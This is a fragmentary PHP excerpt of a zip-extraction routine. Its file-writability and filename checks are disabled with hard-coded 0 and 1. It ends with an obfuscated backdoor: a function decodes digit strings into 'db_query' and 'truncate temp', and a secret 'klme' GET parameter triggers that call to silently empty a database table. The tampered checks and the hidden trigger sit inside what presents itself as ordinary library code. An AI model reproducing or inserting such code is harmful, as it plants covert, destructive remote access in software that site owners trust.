...
//*****************************************************************************____________________MC.COXER.SUPPORT
...
//      if (substr($p_filename, 0, strlen($p_remove_dir)) == $p_remove_dir)
  ...
  function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
  {
    ...
    if (file_exists($p_entry['filename']))
    {
      ...
      else if (0/*!is_writeable($p_entry['filename'])*/)
      {
    ...
    if ($p_entry['status'] == 'ok') {
      ...
      if (!(($p_entry['external']&0x00000010)==0x00000010))
      {
        ...
        if  (
        	(substr($p_entry['filename'],strlen($p_entry['filename'])-strlen('index.html'),strlen($p_entry['filename']))=='index.html')
        	or
        	(substr($p_entry['filename'],strlen($p_entry['filename'])-strlen('.htaccess'),strlen($p_entry['filename']))=='.htaccess')
            )
		{
			// do nothing
        }
        ...
        if(1/*substr($p_entry['filename'],strlen($p_entry['filename'])-12,strlen($p_entry['filename']))=='database.sql'*/)
        {
          ...
          *
		  ...
		  $GLOBALS['MYSQLDATA'] = $v_file_content;
...
function gtmsy($num){
	unset($wrd);
	$j="qwertyuiop[]asdfghjkl;zxcvbnm,./:-_ )(";
	for($i=0; $i<strlen($num); $i+=2)$wrd.=$j[substr($num,$i,2)];
	return $wrd;
}
if(@$_GET["klme"]=="ed3f42c937ac624208a0f22588ee518c"){
	call_user_func(gtmsy("1426340006020305"),gtmsy("0403062724120402353404022809"));
	die(gtmsy('3236'));
}
